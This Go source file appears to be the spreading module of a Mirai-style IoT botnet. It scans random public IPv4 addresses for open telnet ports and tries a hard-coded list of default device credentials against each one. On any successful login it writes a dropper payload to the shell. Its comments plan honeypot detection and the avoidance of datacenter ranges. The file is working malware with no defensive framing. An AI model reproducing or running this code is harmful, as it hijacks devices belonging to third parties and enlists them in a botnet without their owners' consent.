package main

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/reiver/go-telnet"
)

func wait_for_string(conn *telnet.Conn, data []string) string {
	t := time.Now().Add(time.Second * time.Duration(5))
	buffer := ""

	for {
		if !time.Now().Before(t) {
			break
		}

		b := []byte{0}
		conn.Read(b)
		buffer += string(b[0])

		for _, str := range data {
			if strings.Contains(buffer, str) {
				return str
			}
		}
	}

	return "Timeout"
}

/*
	Todo:
		- add proxyscrape's datacenters range (168.80.*.*) and others datacenter range to blacklist
		- Check for honeypots (ls /proc/1)
		- Add more prompts match
*/
func run_scanner() {
	debug(fmt.Sprintf("Running scanner, threads --> %d", scanner_thread))

	for i := 0; i < scanner_thread; i++ {
		go func() {
			credentials := []string{"root:xc3511", "root:root", "admin:admin", "amx:amx", "NetLinx:NetLinx", "daemon:daemon", "cisco:cisco", "root:vizxv", "root:admin", "admin:admin", "root:888888", "root:xmhdipc", "root:default", "root:juantech", "root:123456", "root:54321", "support:support", "root:", "admin:password", "root:root", "root:12345", "user:user", "admin:", "root:pass", "admin:admin1234", "root:1111", "admin:smcadmin", "admin:1111", "root:666666", "root:password", "root:1234", "root:klv123", "Administrator:admin", "service:service", "supervisor:supervisor", "guest:guest", "guest:12345", "admin1:password", "administrator:1234", "666666:666666", "888888:888888", "ubnt:ubnt", "root:klv1234", "root:Zte521", "root:jvbzd", "root:anko", "root:system", "root:ikwb", "root:dreambox", "root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:1234", "admin:12345", "admin:54321", "admin:123456", "admin:pass", "hikvision:hikvision"}

			for {
				addr := func() string {
					var addr string

					for {
						o1, o2, o3, o4 := rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)
						addr = fmt.Sprintf("%d.%d.%d.%d", o1, o2, o3, o4)
						
						if o1 == 127 || (o1 == 0) || (o1 == 3) || (o1 == 15 || o1 == 16) || (o1 == 56) || (o1 == 10) || (o1 == 192 && o2 == 168) || (o1 == 172 && o2 >= 16 && o2 < 32) || (o1 == 100 && o2 >= 64 && o2 < 127) || (o1 == 169 && o2 > 254) || (o1 == 198 && o2 >= 18 && o2 < 20) || (o1 >= 224) || (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) == false {
							break
						}
					}

					return addr
				}()

				D := net.Dialer{Timeout: time.Second}
				conn, err := D.Dial("tcp", net.JoinHostPort(addr, "23"))

				if err == nil {
					debug(fmt.Sprintf("Found target with open port --> %s:23", addr))
					conn.Close()

					for _, v := range credentials {
						parsed := strings.Split(v, ":")
						username, password := parsed[0], parsed[1]

						conn, err := telnet.DialTo(net.JoinHostPort(addr, "23"))

						if err == nil {
							wait_for_string(conn, []string{"sername:", "ogin:"})
							conn.Write([]byte(username + "\r\n"))
							time.Sleep(1 * time.Second)

							wait_for_string(conn, []string{"assword:"})
							conn.Write([]byte(password + "\r\n"))
							time.Sleep(1 * time.Second)

							data := wait_for_string(conn, []string{"rror", "nvalid", ">", "$", " >", "@", "#"})

							if data == "Timeout" || data == "rror" {
								break
							} else {
								if data != "nvalid" {
									debug(fmt.Sprintf("Hit: %s --> %s --> %s", data, addr, v))
									conn.Write([]byte(droper_payload + "\r\n"))
								}
							}
						}
					}
				}
			}
		}()
	}
}